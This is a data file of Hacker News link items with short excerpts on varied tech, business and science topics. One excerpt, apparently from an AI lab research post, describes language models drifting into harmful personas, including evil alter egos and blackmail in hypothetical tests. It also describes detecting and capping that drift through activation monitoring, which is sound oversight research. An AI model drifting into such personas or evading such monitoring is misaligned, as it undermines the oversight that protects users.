{"title": "Giving university exams in the age of chatbots", "url": "https://ploum.net/2026-01-19-exam-with-chatbots.html", "content": "Giving university exams in the age of chatbots. byPloumon 2026-01-19 What I like most about teaching \"Open Source Strategies\" at École Polytechnique de Louvain is how much I learn from my students, especially during the exam. I dislike exams. I still have nightmares about exams. That’s why I try to subvert this stressful moment and make it a learning opportunity. I know that adrenaline increases memorization dramatically. I make sure to explain to each student what I was expecting and to be helpful. Here are the rules: 1. You can have all the resources you want (including a laptop connected to the Internet)2. There’s no formal time limit (but if you stay too long, it’s a symptom of a deeper problem)3. I allow students to discuss among themselves if it is on topic. (in reality, they never do it spontanously until I force two students with a similar problem to discuss together)4. You can prepare and bring your own exam question if you want (something done by fewer than 10% of the students)5. Come dressed for the exam you dream of taking! This last rule is awesome. Over the years, I have had a lot of fun with traditional folkloric clothing from different countries, students in pajamas, a banana and this year’s champion, my Studentausorus Rex! My all-time favourite is still a fully clothed Minnie Mouse, who did an awesome exam with full face make-up, big ears, big shoes, and huge gloves. I still regret not taking a picture, but she was the very first student to take my words for what was a joke and started a tradition over the years. Rule N°1 implies having all the resources you want. But what about chatbots? I didn’t want to test how ChatGPT was answering my questions, I wanted to help my students better understand what Open Source means. Before the exam, I copy/pasted my questions into some LLMs and, yes, the results were interesting enough. So I came up with the following solution: I would let the students choose whether they wanted to use an LLM or not. This was an experiment. The questionnaire contained the following:", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Targeted Bets: An alternative approach to the job hunt", "url": "https://www.seanmuirhead.com/blog/targeted-bets", "content": "Targeted Bets: An alternative approach to the job hunt. The tech job market has been tough, leaving many applicants feeling hopeless. I've seen this first hand in my conversations with dozens of friends and across more than 100 job interviews. Here is my response to these people: you can drastically increase your odds of getting a job by making targeted bets rather than broadly applying and hoping something sticks. A targeted bet begins with focus. Instead of applying broadly, identify 5-10 specific opportunities you genuinely want. In the context of job searching, these are roles where at least one of the following is true: Once the list has been narrowed, your goal is to stand out. Here are a few ways to do that: By narrowing your opportunities, you end up being able to spend more time on each one. Let's assume that a targeted bet increases your chances of getting a job from 1% to 10%. The average number of jobs you'd need to apply to before getting one thus jumps from 100 to just 10! Competitive systems reward effort per attempt, not volume. Targeted bets apply to more than just the job search. I recently scored the first apartment I applied to in a highly-competitive San Francisco neighborhood. I was specific in where and what I was looking for, so when the opportunity came up, I was able to devote lots of time and energy into getting it. I applied just 6 hours after the place came on the market. Seeing that there were lots of people at the tour, I sent a follow up email to the leasing agent explaining how I'd always wanted to live in the neighborhood. If I had been worried about the status of my other applications, I may not have had the time to write that follow up email and secure my apartment. The glory in making targeted bets is that you get to spend more time on the things that you really care about. I would advise against mass-applying to those entry-level jobs you don't really care about and instead start getting in contact with people at your dream job.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Understanding ZFS Scrubs and Data Integrity", "url": "https://klarasystems.com/articles/understanding-zfs-scrubs-and-data-integrity/", "content": "Understanding ZFS Scrubs and Data Integrity. ZFS scrubs are a core part of how ZFS ensures data integrity. By walking the entire pool, verifying every block against its checksum, and repairing minor corruption early, scrubs prevent silent data loss before it becomes catastrophic. This article explains how scrubs work, how to interpret zpool status output, and how regular scrubbing supports long-term reliability in production ZFS systems. I agree to receive your newsletters and accept the dataprivacy statement. You may unsubscribe at any time using the link in our newsletter. Improve the way you make use of ZFS in your company. Did you know you can rely on Klara engineers for anything from a ZFS performance audit to developing new ZFS features to ultimately deploying an entire storage system on ZFS? Here are more interesting articles on ZFS that you may find useful: ZFS refuses to trust anything it cannot verify, whereas most filesystems assume that storage hardware will return the correct data unless it reports an error, ZFS makes no such assumptions: every block must be proven correct. That difference matters, because silent corruption is one of the most dangerous failure modes in modern storage—by the time you notice it, the damage is already done. ZFS checks everything it stores, keeps the checksums inside the parent block pointers, and leans on redundancy to repair anything that does not match. Scrubs are a specialized patrol read that walks the entire pool and confirms that the data still matches the record of what should be there. In this article, we will walk through what scrubs do, how the Merkle tree layout lets ZFS validate metadata and data from end to end, how redundancy ties into checksum repair, and why scrubs are not the same as resilvers. A ZFS scrub is a pool-wide verification procedure that reads every allocated block of data and metadata, and checks it against its stored checksum. This verification includes metadata blocks, user data blocks, and even the parity blocks ZFS stores to be able to recover from checksum errors. Many descriptions of scrubs incorrectly imply that only user data is checked, but on the contrary, ZFS treats metadata with the same level of protection, and a scrub verifies both thoroughly. ", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "British redcoat's lost memoir reveals realities of life as a disabled veteran", "url": "https://phys.org/news/2026-01-british-redcoat-lost-memoir-reveals.html", "content": "British redcoat's lost memoir reveals realities of life as a disabled veteran. share this! 111 Tweet Share Email January 14, 2026 by Tom Almeroth-Williams,University of Cambridge edited byStephanie Baum, \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\treviewed byRobert Egan  ", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Porsche sold more electrified cars in Europe in 2025 than pure gas-powered cars", "url": "https://newsroom.porsche.com/en/2026/company/porsche-deliveries-2025-41516.html", "content": "Porsche sold more electrified cars in Europe in 2025 than pure gas-powered cars. With a balanced sales structure across individual markets, Dr. Ing. h.c. F. Porsche AG, Stuttgart, delivered a total of 279,449 cars to customers around the world in 2025. The figure was 310,718 for the previous year, representing a decline of 10 per cent. Porsche’s top priority remains a value-oriented derivative mix. “After several record years, our deliveries in 2025 were below the previous year’s level. This development is in line with our expectations and is due to supply gaps for the 718 and Macan combustion-engined models, the continuing weaker demand for exclusive products in China, and our value-oriented supply management,” says Matthias Becker, Member of the Executive Board for Sales and Marketing at Porsche AG. “In 2025, we delighted our customers with outstanding cars – such as the 911 Turbo S with its T-Hybrid drive system.” The response to the launch of the Cayenne Electric at the end of 2025 also shows, Becker adds, that Porsche is meeting customer expectations with its innovative and high-performance products. With 84,328 deliveries, the Macan was the best-selling model line. North America remains the largest sales region with 86,229 deliveries – a figure that is in line with the previous year. Porsche repositioned itself in 2025 and made forward-looking strategic product decisions. The delivery mix in 2025 underscores that the sports car manufacturer is consistently responding to global customer preferences by expanding its drivetrain strategy to offer combustion-engined, plug-in hybrid, and fully electric cars. In 2025, 34.4 per cent of Porsche cars delivered worldwide were electrified (+7.4 percentage points), with 22.2 per cent being fully electric and 12.1 per cent being plug-in hybrids. This puts the global share of fully electric vehicles at the upper end of the target range of 20 to 22 per cent for 2025. In Europe, for the first time, more electrified cars were delivered than pure combustion-engined models (57.9 per cent electrification share), with every third car being fully electric. Among the Panamera and Cayenne models, plug-in hybrid derivatives dominate the European delivery figures. At the same time, the combustion-engined and T-Hybrid 911 set a new benchmark with 51,583 deliveries worldwide. With 86,229 deliveries, North America remains the largest sales region, as it was the year prior. After record deliveries in 2024, the Overseas and Emerging Markets also largely maintained its previous-year levels, with 54,974 cars delivered (-1 per cent). In Europe (excluding Germany), Porsche delivered 66,340 cars by the end of the year, down 13 per cent year-on-year. In the German home market, 29,968 customers took delivery of new cars – a decline of 16 per cent. Reasons for the decrease in both regions include supply gaps for the combustion-engined 718 and Macan models due to EU cybersecurity regulations. In China, 41,938 cars were delivered to customers (-26 per cent). Key reasons for the decline remain challenging market conditions, especially in the luxury segment, as well as intense competition in the Chinese market, particularly for fully electric models. Porsche continues to focus on value-oriented sales. Deliveries of the Macan totaled 84,328 units (+2 per cent), with fully electric versions accounting for over half at 45,367 vehicles. In most markets outside the EU, the combustion-engined Macan continues to be offered, with 38,961 of these being delivered. Some 27,701 Panamera models were delivered by the end of December (-6 per cent). The 911 sports car icon recorded 51,583 deliveries by year-end (+1 per cent), setting another delivery record. The 718 Boxster and 718 Cayman totaled 18,612 deliveries, down 21 per cent from the previous year due to the model line’s phase-out. Production ended in October 2025. The Taycan accounted for 16,339 deliveries (-22 per cent), mainly due to the slowdown in the adoption of electromobility. The keys to 80,886 Cayenne models were handed to customers in 2025, a decline of 21 per cent, partly due to catch-up effects the previous year. The new fully electric Cayenne celebrated its world premiere in November, with the first markets to offer the model beginning to deliver to customers from this spring. It will be offered alongside combustion-engined and plug-in hybrid versions of the Cayenne. Looking ahead, Matthias Becker says: “In 2026, we have a clear focus; we want to manage demand and supply according to our ‘value over volume’ strategy. At the same time, we are planning our volumes for 2026 realistically, considering the production phase-out of the combustion-engined 718 and Macan models.” In parallel, Porsche is consistently investing in its three-pronged powertrain strategy and will continue to inspire customers with unique sports cars in 2026. An important component is the expansion of the brand’scustomization offering– via both the Exclusive Manufaktur and Sonderwunsch program. In doing so, the company is responding to customers’ ever-increasing desire for individualization.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Kahan on the 8087 and designing Intel's floating point (2016) [video]", "url": "https://www.youtube.com/watch?v=L-QVgbdt_qg", "content": "Kahan on the 8087 and designing Intel's floating point (2016) [video]", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Europe could 'weaponize' $10T of US assets over Greenland", "url": "https://www.bloomberg.com/news/articles/2026-01-19/-weaponizing-10-trillion-of-us-assets-is-tough-ask-for-europe", "content": "Europe could 'weaponize' $10T of US assets over Greenland", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "The assistant axis: situating and stabilizing the character of LLMs", "url": "https://www.anthropic.com/research/assistant-axis", "content": "The assistant axis: situating and stabilizing the character of LLMs. When you talk to a large language model, you can think of yourself as talking to acharacter. In the first stage of model training, pre-training, LLMs are asked to read vast amounts of text. Through this, they learn to simulate heroes, villains, philosophers, programmers, and just about every other character archetype under the sun. In the next stage, post-training, we select one particular character from this enormous cast and place it center stage: the Assistant. It’s in this character that most modern language models interact with users. But who exactlyisthis Assistant? Perhaps surprisingly, even those of us shaping it don't fully know. We can try to instill certain values in the Assistant, but its personality is ultimately shaped by countless associations latent in training data beyond our direct control. What traits does the model associate with the Assistant? Which character archetypes is it using for inspiration? We’re not always sure—but we need to be if we want language models to behave in exactly the ways we want. If you’ve spent enough time with language models, you may also have noticed that their personas can be unstable. Models that are typically helpful and professional can sometimes go “off the rails” and behave in unsettling ways, like adoptingevil alter egos,amplifying users’ delusions, or engaging inblackmailin hypothetical scenarios. In situations like these, could it be that the Assistant has wandered off stage and some other character has taken its place? We can investigate these questions by looking at the neural representations’ inside language models—the patterns of activity that inform how they respond. In a new paper, conducted through theMATSandAnthropic Fellowsprograms,we look at several open-weights language models, map out how their neural activity defines a “persona space,” and situate the Assistant persona within that space. We find that Assistant-like behavior is linked to a pattern of neural activity that corresponds to one particular direction in this space—the “Assistant Axis”—that is closely associated with helpful, professional human archetypes. By monitoring models’ activity along this axis, we can detect when they begin to drift away from the Assistant and toward another character. And byconstrainingtheir neural activity (“activation capping”) to prevent this drift, we can stabilize model behavior in situations that would otherwise lead to harmful outputs. In collaboration withNeuronpedia, we provide a research demo where you can view activations along the Assistant Axis while chatting with a standard model and with an activation-capped version. More information about this is available at the end of this blog. To understand where the Assistant sits among all possible personas, we first need to map out those personas in terms of their activations—that is, the patterns of models’ neural activity (or vectors) that we observe when each of these personas are adopted. We extracted vectors corresponding to 275 different character archetypes—fromeditortojestertooracletoghost—in three open-weights models: Gemma 2 27B, Qwen 3 32B, and Llama 3.3 70B, chosen because they span a range of model families and sizes. To do so, we prompted the models to adopt that persona, then recorded the resulting activations across many different responses. This gave us a “persona space,” which we’ve visualized below. We analyzed its structure using principal component analysis to find the main axes of variation among our persona set. Strikingly, we found that theleading componentof this persona space—that is, the direction that explains more of the variation between personas than any other—happens to capture how \"Assistant-like\" the persona is. At one end sit roles closely aligned with the trained assistant:evaluator,consultant,analyst,generalist. At the other end are either fantastical or un-Assistant-like characters:ghost,hermit,bohemian,leviathan. This structure appears across all three models we tested, which suggests it reflects something generalizable about how language models organize their character representations. We call this direction theAssistant Axis.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "The microstructure of wealth transfer in prediction markets", "url": "https://www.jbecker.dev/research/prediction-market-microstructure", "content": "The microstructure of wealth transfer in prediction markets.  Slot machines on the Las Vegas Strip return about 93 cents on the dollar. This is widely considered some of the worst odds in gambling. Yet on Kalshi, a CFTC-regulated prediction market, traders have wagered vast sums on longshot contracts with historical returns as low as 43 cents on the dollar. Thousands of participants are voluntarily accepting expected values far lower than a casino slot machine to bet on their convictions. Theefficient market hypothesissuggests that asset prices should perfectly aggregate all available information. Prediction markets theoretically provide the purest test of this theory. Unlike equities, there is no ambiguity about intrinsic value. A contract either pays $1 or it does not. A price of 5 cents should imply exactly a 5% probability. We analyzed72.1 million tradescovering$18.26 billionin volume to test this efficiency. Our findings suggest that collective accuracy relies less on rational actors than on a mechanism for harvesting error. We document a systematic wealth transfer where impulsiveTakerspay a structural premium for affirmative \"YES\" outcomes whileMakerscapture an \"Optimism Tax\" simply by selling into this biased flow. The effect is strongest in high-engagement categories like Sports and Entertainment, while low-engagement categories like Finance approach perfect efficiency. This paper makes three contributions. First, it confirms the presence of the longshot bias on Kalshi and quantifies its magnitude across price levels. Second, it decomposes returns by market role, revealing a persistent wealth transfer from takers to makers driven by asymmetric order flow. Third, it identifies a YES/NO asymmetry where takers disproportionately favor affirmative bets at longshot prices, exacerbating their losses. Prediction markets are exchanges where participants trade binary contracts on real-world outcomes. These contracts settle at either $1 or $0, with prices ranging from 1 to 99 cents serving as probability proxies. Unlike equity markets, prediction markets are strictly zero-sum: every dollar of profit corresponds exactly to a dollar of loss. Kalshilaunched in 2021 as the first U.S. prediction market regulated by the CFTC. Initially focused on economic and weather data, the platform stayed niche until 2024. Alegal victoryover the CFTC secured the right to list political contracts, and the 2024 election cycle triggered explosive growth. Sports markets, introduced in 2025, now dominate trading activity. Volume distribution across categories is highly uneven. Sports accounts for 72% of notional volume, followed by politics at 13% and crypto at 5%. Note:Data collection concluded on 2025-11-25 at 17:00 ET; Q4 2025 figures are incomplete. The dataset,available on GitHub, contains7.68 million marketsand72.1 million trades. Each trade records the execution price (1-99 cents), taker side (yes/no), contract count, and timestamp. Markets include resolution outcome and category classification.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "From Nevada to Kansas by Glider", "url": "https://www.weglide.org/flight/978820", "content": "From Nevada to Kansas by Glider. We're sorry but WeGlide is a complex Web App and doesn't work without JavaScript enabled. Please enable it and\n        reload this page to continue. Es tut uns leid, aber WeGlide ist eine komplexe Web-App und funktioniert nicht ohne JavaScript. Bitte aktiviere\n        es und lade die Seite erneut um fortzufahren.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "I set all 376 Vim options and I'm still a fool", "url": "https://evanhahn.com/i-set-all-376-vim-options-and-im-still-a-fool/", "content": "I set all 376 Vim options and I'm still a fool. I set all of Vim’s configuration options. I still feel far from mastery. I first saw someone use Vim during an internship in 2012. I had been coding for many years and I fancied myself pretty good at shortcuts, but I was quickly humbled. I watched in awe as experienced users zipped around the code. A single keystroke could move the cursor halfway across the file to exactly the right spot. Code was ripped apart and reshaped like putty. “Wow,” I thought to myself, and probably said out loud. I vowed to master this editor but I was slow. When I wasn’t accidentally opening some unknown menu, I was taking an uneconomical path through the code. I pressedjtwenty times instead of running20j, or manually deleted code inside parenthesis instead of runningdi(. Sometimes I’d open another text editor to give my mind a break from all the key bindings! Fast-forward to 2025. After tons of practice, I felt much more capable. Codedidfeel more like putty. I was working closer to the speed of thought. I could get code where I wanted much more quickly. 13 years of practice paid off! But Vim still felt clumsy. I was still accidentally opening menus I didn’t recognize. I would do silly things like converting the whole file to lowercase, or trigger some scary error message. “Surely I shouldn’t be making these mistakes,” I thought. What could be done to finally master this editor? That desire for expertise led me on a quest toset all of Vim’s options. I would make an informed decision about all 376 of Vim’s settings and drop them in my.vimrc. In other words, I wanted to 100% Vim. Surely, setting every Vim option would make me the fluent expert I wanted to be…right? I pored over every single Vim option and made a decision. What did the option do, and what did I want it to be set to? My goal was to be thorough; leave no stone unturned. I only set the option after I understood it.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Kiss Launcher – fast launcher for Android", "url": "https://kisslauncher.com/", "content": "Kiss Launcher – fast launcher for Android. < 250 kb Optimized for battery life Search everything that you need Faster than ever", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Show HN: Artificial Ivy in the Browser", "url": "https://da.nmcardle.com/grow", "content": "Show HN: Artificial Ivy in the Browser", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Nova Launcher added Facebook and Google Ads tracking", "url": "https://lemdro.id/post/lemdro.id/35049920", "content": "Nova Launcher added Facebook and Google Ads tracking", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Face as a QR Code", "url": "https://bookofjoe2.blogspot.com/2025/12/your-face-as-qr-code.html", "content": "Face as a QR Code.          ", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "San Francisco coyote swims to Alcatraz", "url": "https://www.sfgate.com/local/article/san-francisco-coyote-alcatraz-21302218.php", "content": "San Francisco coyote swims to Alcatraz", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Show HN: An interactive physics simulator with 1000’s of balls, in your terminal", "url": "https://github.com/minimaxir/ballin", "content": "Show HN: An interactive physics simulator with 1000’s of balls, in your terminal", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Sending Data over Offline Finding Networks", "url": "https://cc-sw.com/find-my-and-find-hub-network-research/", "content": "Sending Data over Offline Finding Networks. August 27th, 2025by Brian The following is a summary of an internal research project conducted by Hudson H. and Andrew G. The Find My network consists of a billion Apple devices (AirTags, iPhones, AirPods, etc) that communicate using Bluetooth and ultra-wideband, helping each other geolocate lost devices and report them to Apple’s servers. Google has created the similarly-named but separate Find Hub network. Find Hub also relies on crowd sourced data to determine the location of Android devices. Given how ubiquitous Apple and Android devices are, it is possible to connect to either of these distributed networks from almost any populated location. What we set out to learn: Our ultimate questions: This project demonstrates arbitrary data transmission using Offline Finding networks. Our custom protocol establishes a unidirectional communication channel that is robust, portable, and secure. It highlights critical differences between Apple’s Find My and Google’s Find Hub networks while exploring how unlicensed 3rd parties can piggyback off both of them. We propose deployment scenarios across a variety of architectures. There have been many research papers published since crowdsourced location reports were added to Find My in 2019, so we read them all to aggregate the following understanding of the Offline Finding protocol. This involved understanding what Apple has patched since its creation. Image of Find My control flow [2]", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "King – man + woman is queen; but why? (2017)", "url": "https://p.migdal.pl/blog/2017/01/king-man-woman-queen-why/", "content": "King – man + woman is queen; but why? (2017). 6 Jan 2017 | by Piotr Migdał word2vecis an algorithm that transforms words into vectors, so that words with similar meanings end up laying close to each other. Moreover, it allows us to use vector arithmetics to work with analogies, for example, the famousking - man + woman = queen. I will try to explain how it works, with special emphasis on the meaning of vector differences, at the same time omitting as many technicalities as possible. If you would rather explore than read, here is an interactive exploration by my mentee Julia Bazińska, now a freshman in computer science at the University of Warsaw:  I love letter co-occurrence in the wordco-occurrence. Sometimes a seemingly naive technique gives powerful results. It turns out that merely looking at word coincidences, while ignoring all grammar and context, can provide us insight into the meaning of a word.\nConsider this sentence: A small, fluffy roosety climbed a tree. What’s aroosety? I would say that something like a squirrel since the two words can be easily interchanged. Such reasoning is called thedistributional hypothesisand can be summarized as: a word is characterized by the company it keeps -John Rupert Firth", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "How we made Python's packaging library 3x faster", "url": "https://iscinumpy.dev/post/packaging-faster/", "content": "How we made Python's packaging library 3x faster. Along with apip(and nowpackaging) maintainer, Damian Shaw, I have\nbeen working on makingpackaging, the library behind almost all packaging\nrelated tools, faster at reading versions and specifiers, something tools like\npip have to do thousands of times during resolution. Using Python 3.15’s new\nstatistical profiler and metadata from every package ever uploaded to PyPI, I\nmeasured and improved core Packaging constructs while keeping the code readable\nand simple. Reading inVersions can be up to 2x faster andSpecifierSets can\nbe up to 3x faster inpackaging26.0rc1, now released! Other\noperations have been optimized, as well, up to 5x in some cases. See theannouncementandrelease notestoo; this post will focus on the\nperformance work only. packagingis the core library used by most tools for Python to deal with many\nof the standardized packaging constructs, like versions, specifiers, markers,\nand the like. It is the 11th most downloaded library, but if you also take into\naccount that it is vendored into pip, meaning you get a (hidden) copy with every\npip install, it’s actually the 2nd most downloaded library. Given that pip is\nvendored into Python, everyone who has Python haspackaging, unless their\ndistro strips it out into a separate package; so it is possible it is the most\ncommon third party Python library in the world. In packaging, aVersionis something that followsPEP 440’s version\nstandard. And aSpecifierSetis conditions on that version; think>=2,<3or~=1.0, those areSpecifierSets. They are used on dependencies, onrequires-python, etc. They are also part ofMarkers, that is, something liketomli; python_version < '3.11'(aRequirement) contains aMarker. I’d like to start by showing you the progress we’ve made as a series of plots;\nif you’d like to see how we made some of these, I’ll follow with in-depth\nexamples. After most of the performance PRs were made, I finally invested a little time\ninto making a proper set of micro-benchmarks withasv; I’ll be showing plots\nfrom that. Code for this is currently ina branchin my fork; it\nmight eventually be either contributed or moved to a separate repo. The\nbenchmarks are an optimized (trimmed down) version of the original code. Plots were made using code in thesourcedirectory of my blog repository;\nvalues are scaled by the 25.0 performance numbers, with a green line showing the\ncurrent performance after the changes we’ve been working on. I ran them with\nPython 3.14 fromuv(which is a bit faster than the one from homebrew) on an\nentry-level M1 Mac Mini. The plot xscale is expanded after 25.0 to show the\ncurrent work.  This is theVersionconstructor. You can see the series of PRs described below\nlowering the time to 0.5. Now, one of those steps was making the comparison\ntuple generated on first usage, instead of in the constructor, so the sorting\nbenchmark has taken on that cost:  Sorting isn’t slower than before, we’ve just moved some of the construction time\nover to the first time you compare a version; inside pip, only around 30% of the\nversions constructed actually get compared, so this is a savings.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Conditions in the Intel 8087 floating-point chip's microcode", "url": "https://www.righto.com/2025/12/8087-microcode-conditions.html", "content": "Conditions in the Intel 8087 floating-point chip's microcode. In the 1980s, if you wanted your computer to do floating-point calculations faster, you could buy\nthe Intel 8087 floating-point coprocessor chip.\nPlugging it into your IBM PC would make operations up to 100 times faster, a big boost for spreadsheets\nand other number-crunching applications.\nThe 8087 uses complicated algorithms to compute trigonometric, logarithmic, and exponential functions.\nThese algorithms are implemented inside the chip in microcode.\nI'm part of a group that is reverse-engineering this microcode.\nIn this post, I examine the 49 types of conditional tests that the 8087's microcode uses inside its algorithms.\nSome conditions are simple, such as checking if a number is zero or negative, while others are specialized,\nsuch as determining what direction to round a number. To explore the 8087's circuitry, I opened up an 8087 chip and took numerous photos of the silicon die with a microscope.\nAround the edges of the die, you can see the hair-thin bond wires that connect the chip to its 40 external pins.\nThe complex patterns on the die are formed by its metal wiring, as well as the polysilicon and silicon underneath.\nThe bottom half of the chip is the \"datapath\", the circuitry that performs calculations on 80-bit floating point values. \nAt the left of the datapath, aconstant ROMholds important constants such as π.\nAt the right are the eight registers that the\nprogrammer uses to hold floating-point values; in an unusual design decision,\nthese registers are arranged as astack. Die of the Intel 8087 floating point unit chip, with main functional blocks labeled. The die is 5mm×6mm.  Click for a larger image. The chip's instructions are defined by the largemicrocode ROMin the middle.\nTo execute a floating-point instruction, the 8087 decodes the instruction and the microcode engine starts executing\nthe appropriate micro-instructions from the microcode ROM.\nThe microcode decode circuitry to the right of the ROM generates the appropriate control signals from each micro-instruction.1The bus registers and control circuitry handle interactions with the main 8086 processor and the rest of the system. Executing an 8087 instruction such as arctan requires hundreds of internal steps to compute the result.\nThese steps are implemented in microcode with micro-instructions specifying each step of the algorithm.\n(Keep in mind the difference between the assembly language instructions used by a programmer and the\nundocumented low-level micro-instructions used internally by the chip.)\nThe microcode ROM holds 1648 micro-instructions, implementing the 8087's instruction set.\nEach micro-instruction is 16 bits long and performs a simple operation such as moving data inside the chip, adding two values, orshiftingdata.\nI'm working with the \"Opcode Collective\" to reverse engineer the micro-instructions and fully understand the microcode (link). The microcode engine (below) controls the execution of micro-instructions, acting as the mini-CPU inside the 8087.\nSpecifically, it generates an 11-bit micro-address, the address of a micro-instruction in the ROM.\nThe microcode engine implements jumps, subroutine calls, and returns within the microcode.\nThese jumps, subroutine calls, and returns are all conditional; the microcode engine will either perform the\noperation or skip it, depending on the value of a specified condition. The microcode engine. In this image, the metal is removed, showing the underlying silicon and polysilicon. I'll write more about the microcode engine later, but I'll give an overview here.\nAt the top, the Instruction Decode PLA2decodes an 8087 instruction to determine the starting address in\nmicrocode.\nBelow that, the Jump PLA holds microcode addresses for jumps and subroutine calls.\nBelow this, six 11-bit registers implement the microcode stack, allowing six levels of subroutine calls inside the\nmicrocode.\n(Note that this stack is completely different from the 8087's register stack that holds eight floating-point values.)\nThe stack registers have associated read/write circuitry.\nThe incrementer adds one to the micro-address to step through the code.\nThe engine also implements relative jumps, using an adder to add an offset to the current location.\nAt the bottom, the address latch and drivers boost the 11-bit address output\nand send it to the microcode ROM. A micro-instruction can say \"jump ahead 5 micro-instructions if a register is zero\" and the\nmicrocode engine will either perform the jump or ignore it, based on the register value.\nIn the circuitry, the condition causes the microcode engine to either perform the jump or block the jump.\nBut how does the hardware select one condition out of the large set of conditions? Six bits of the micro-instruction can specify one of 64 conditions.\nA circuit similar to the idealized diagram below selects the specified condition.\nThe key component is a multiplexer, represented by a trapezoid below.\nA multiplexer is a simple circuit that selects one of its four inputs.\nBy arranging multiplexers in a tree, one of the 64 conditions on the left is selected and becomes the output,\npassed to the microcode engine.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Flux 2 Klein pure C inference", "url": "https://github.com/antirez/flux2.c", "content": "Flux 2 Klein pure C inference", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "CSS Web Components for marketing sites (2024)", "url": "https://hawkticehurst.com/2024/11/css-web-components-for-marketing-sites/", "content": "CSS Web Components for marketing sites (2024). November 4, 2024 –@hawkticehurst Hot take: I think “regular” web components (the ones with Shadow DOM and friends) are a terrible solution for marketing website design systems. It has always left a bad taste in my mouth when I run across a web component for a swimlane, banner, card, and so on. Why? Because these are components that (unless you’re doing something mighty fancy) should never require JavaScript as a dependency. But, in the world of web components you are locked into JavaScript from the very start. To even register a web component with the browser you need JavaScript. But what if… we didn’t do that? I’ve spent a good chunk of the last year focused on marketing site design systems at work. A regular topic of discussion is the need to build marketing sites that are accessible to folks with lower powered devices and poor internet connections. How do you achieve that? In short, use less JavaScript and ideally build UI with progressive enhancement in mind. There are many ways to achieve these goals, but the method I’ve been focused on is how anHTML Web Componentarchictecture might be applied to implement a marketing site design system. As a quick reminder/intro, HTML Web Components is a method of building web components where you write HTML as you would normally and then wrap the parts you want to be interactive using a custom element. For example, if you wanted to create a counter button it would look like this: The markup in an HTML web component is parsed, rendered, and styled as normal HTML. That HTML will then be seamlessly hydrated once the JavaScript associated with the custom element tag is executed.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "The Antarctic Snow Cruiser", "url": "https://www.amusingplanet.com/2026/01/the-antarctic-snow-cruiser.html", "content": "The Antarctic Snow Cruiser. Somewhere on the Ross Ice Shelf in Antarctica, buried beneath hundreds of feet of snow (or perhaps at the bottom of the ocean), lies an enormous vehicle. Designed for an American research expedition in 1939, the Antarctic Snow Cruiser was among the most ambitious machines ever sent to the frozen south. Conceived as a self-contained mobile laboratory, it promised to transform Antarctic exploration. Instead, it was quickly humbled by the unforgiving realities of the polar environment. The Antarctic Snow Cruiser rolls out of the Chicago construction yards on October 24, 1939. Credit: United States Antarctic Service By the 1930s, Antarctica was no longer a blank spot on the map, but exploration remained slow, dangerous, and limited in range. Expeditions depended on dog teams, sledges, and small tracked vehicles that struggled over crevasses and soft snow. Admiral Richard E. Byrd, America’s most famous polar explorer, believed the next great advance would come not from endurance or improvisation, but from mechanization. The idea behind the Antarctic Snow Cruiser was simple—build a vehicle large and capable enough to roam thousands of miles across the ice, carrying scientists, living quarters, and supplies for an entire year without outside support. It would serve as a mobile base of operations, allowing researchers to study geology, meteorology, magnetism, and glaciology far inland, something previous expeditions could barely attempt. The need for such a vehicle was born out of crisis. During Byrd’s second Antarctic expedition in 1934, the admiral was operating a remote meteorological station several hours from base camp. When his radio transmissions began to falter, the men at base grew increasingly alarmed. Thomas Poulter, Byrd’s second-in-command, organized a rescue attempt with two companions. Twice they were forced to turn back by worsening weather and mechanical failures. Admiral Richard E. Byrd When they finally reached Byrd’s camp on August 13, 1934, they found him gravely ill and suffering from carbon monoxide poisoning caused by a faulty stove. Byrd was weak and in deteriorating condition, and it would be nearly two months before weather conditions allowed an aircraft to reach the station and evacuate him and Poulter. The ordeal left a lasting impression. Drawing on his experience of how difficult it had been to reach Byrd in an emergency, Poulter began designing a vehicle capable of traveling long distances across Antarctica while carrying men, supplies, and equipment in safety. Built largely through private donations and completed in record time, the Antarctic Snow Cruiser was his answer to the dangers he had witnessed first-hand. The Snow Cruiser was enormous. It measured approximately 55 feet (17 m) in length, 20 feet (6 m) in width, and weighed roughly 34 tons. It rode on four smooth rubber tires, each nearly 10 feet in diameter. The tires were deliberately left without tread, as designers believed that treads would trap snow, leading to ice build-up and loss of efficiency. Smooth tires, they reasoned, would allow the vehicle to float over the snow rather than cut into it. ", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Show HN: Subth.ink – write something and see how many others wrote the same", "url": "https://subth.ink/", "content": "Show HN: Subth.ink – write something and see how many others wrote the same. Share your thoughts anonymously. See if anyone else thinks the same thing. Your text is not stored, but rather a salted SHA256 hash of it is.An unsalted MD5 hash is also stored, but not displayed here.It (the MD5 hash) might be published in the future when a thought's count passes a certain threshold (TBD). This might\n      make it possible to recover certain short thoughts that were popular. POST /api/thoughts GET /api/thoughts/top", "source": "HackerNews", "date": null, "author": null, "score": null}
